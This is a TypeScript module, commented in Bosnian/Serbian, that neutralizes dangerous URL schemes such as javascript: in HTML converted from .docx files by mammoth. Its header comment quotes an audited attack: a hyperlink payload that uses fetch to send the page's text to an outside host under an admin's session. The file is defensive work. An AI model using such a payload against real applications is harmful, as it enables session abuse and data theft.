/**
 * Neutralizacija opasnih URL šema u HTML-u koji je proizveo mammoth.
 *
 * Zašto ovako uzak zahvat, a ne opšti HTML sanitizer:
 * proizvođač je ISKLJUČIVO `mammoth.convertToHtml` (app/api/dokumenti/[id]/pregled
 * i app/(dashboard)/zapisnici). Mammoth escapuje `& " < >` i u tekstu i u vrijednostima
 * atributa (`writers/html-writer.js`), pa proboj taga ili atributa nije moguć — izlazi
 * samo iz zatvorenog skupa tagova. Jedino što NE radi je provjera URL šeme
 * (`document-to-html.js` upisuje `href` doslovno), pa `href="javascript:…"` preživi.
 * To je jedini stvarni ponor i njega zatvaramo ovdje.
 *
 * Iz istog razloga je regex nad atributima ovdje bezbjedan, iako bi nad proizvoljnim
 * HTML-om bio pogrešan alat: navodnika unutar vrijednosti ne može biti jer ih je
 * mammoth već escapovao u `&quot;`.
 *
 * Napad koji ovo zaustavlja (audit 31.07.2026.): operater ubaci .docx sa hyperlink
 * poljem `HYPERLINK "javascript:fetch('https://…'+document.body.innerText)"` i tekstom
 * „Prilog 1 – zapisnik"; admin otvori pregled, klikne, i skripta radi pod njegovom
 * sesijom u origin-u aplikacije. CSP to ne hvata jer Next hidracija traži
 * `script-src 'unsafe-inline'`, a `javascript:` URL je time dozvoljen.
 */

/** Šeme koje smiju ostati u `href`. Sve ostalo se zamjenjuje bezopasnim `#`. */
const DOZVOLJENE_SEME = new Set(["http:", "https:", "mailto:"])

/**
 * Znakovi koje browser ignoriše pri parsiranju šeme (razmaci, tab, novi red, NUL…),
 * pa bi `java\nscript:` inače prošao provjeru a izvršio se. Uklanjaju se prije testa.
 */
const NEVIDLJIVI = /[\u0000-\u0020\u00a0\u1680\u2000-\u200d\u2028\u2029\u202f\u205f\u3000\ufeff]/g

/** Ima li vrijednost eksplicitnu šemu (`nesto:`), i koju? `null` = relativan URL. */
function semaOd(vrijednost: string): string | null {
  const ocisceno = vrijednost.replace(NEVIDLJIVI, "").toLowerCase()
  const m = ocisceno.match(/^([a-z][a-z0-9+.-]*:)/)
  return m ? m[1]! : null
}

/** Smije li ova `href` vrijednost proći? Relativni URL-ovi i sidra su uvijek u redu. */
export function jeBezbjedanHref(vrijednost: string): boolean {
  const sema = semaOd(vrijednost)
  return sema === null || DOZVOLJENE_SEME.has(sema)
}

/**
 * Smije li ova `src` vrijednost proći? Kao `href`, plus `data:image/…` — mammoth
 * ugrađuje slike iz .docx-a kao base64 data URI, a data-slika ne može izvršiti kod.
 * `data:text/html` i sve ostalo se odbija.
 */
export function jeBezbjedanSrc(vrijednost: string): boolean {
  const sema = semaOd(vrijednost)
  if (sema === null || DOZVOLJENE_SEME.has(sema)) return true
  if (sema !== "data:") return false
  return /^data:image\/(png|jpeg|jpg|gif|webp|bmp);/i.test(vrijednost.replace(NEVIDLJIVI, ""))
}

/**
 * Prolazi kroz `href`/`src` atribute mammoth izlaza i zamjenjuje nedozvoljene
 * vrijednosti. Tekst i struktura dokumenta ostaju netaknuti — mijenja se samo
 * odredište linka, pa korisnik i dalje vidi isti sadržaj.
 */
export function ocistiMammothHtml(html: string): string {
  return html.replace(
    /\s(href|src)="([^"]*)"/gi,
    (cijelo: string, atribut: string, vrijednost: string) => {
      const jeHref = atribut.toLowerCase() === "href"
      const ok = jeHref ? jeBezbjedanHref(vrijednost) : jeBezbjedanSrc(vrijednost)
      if (ok) return cijelo
      // `href` → sidro koje ne vodi nigdje; `src` → prazan, da slika samo ne učita.
      return jeHref ? ' href="#"' : ' src=""'
    },
  )
}
